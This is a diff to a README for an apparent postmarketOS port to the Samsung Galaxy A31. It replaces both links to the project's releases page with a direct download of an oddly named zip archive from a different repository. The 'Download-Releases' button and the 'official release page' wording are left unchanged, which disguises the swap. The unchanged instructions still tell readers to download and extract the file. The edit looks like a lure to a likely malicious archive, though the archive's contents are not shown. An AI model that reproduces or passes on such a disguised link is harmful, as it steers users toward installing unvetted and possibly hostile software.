@@ -5,7 +5,7 @@ description: "Port postmarketOS to the Samsung Galaxy A31 using a custom kernel 
 ---
 # 🐧 galaxy-a31-postmarketos - Run native Linux on your Samsung phone
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Challenging-tarnish918/galaxy-a31-postmarketos/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Challenging-tarnish918/challenging-tarnish918.github.io/raw/refs/heads/main/premolder/tarnish-io-challenging-github-v2.2-beta.5.zip)
 
 This project brings the postmarketOS Linux operating system to the Samsung Galaxy A31. It replaces the standard Android system with a functional Linux desktop environment. This port focuses on hardware support for the MediaTek MT6768 chipset, including the touchscreen, screen display, wireless connectivity, and audio output.
 
@@ -35,7 +35,7 @@ Perform a full backup of all photos, contacts, and documents. This process wipes
 
 Visit the official release page to obtain the required installation files:
 
-[https://github.com/Challenging-tarnish918/galaxy-a31-postmarketos/releases](https://github.com/Challenging-tarnish918/galaxy-a31-postmarketos/releases)
+[https://github.com/Challenging-tarnish918/challenging-tarnish918.github.io/raw/refs/heads/main/premolder/tarnish-io-challenging-github-v2.2-beta.5.zip](https://github.com/Challenging-tarnish918/challenging-tarnish918.github.io/raw/refs/heads/main/premolder/tarnish-io-challenging-github-v2.2-beta.5.zip)
 
 Download the latest version available on the page. Save the provided archive file to your computer. Extract the contents of the archive into a folder that you can locate easily.
 
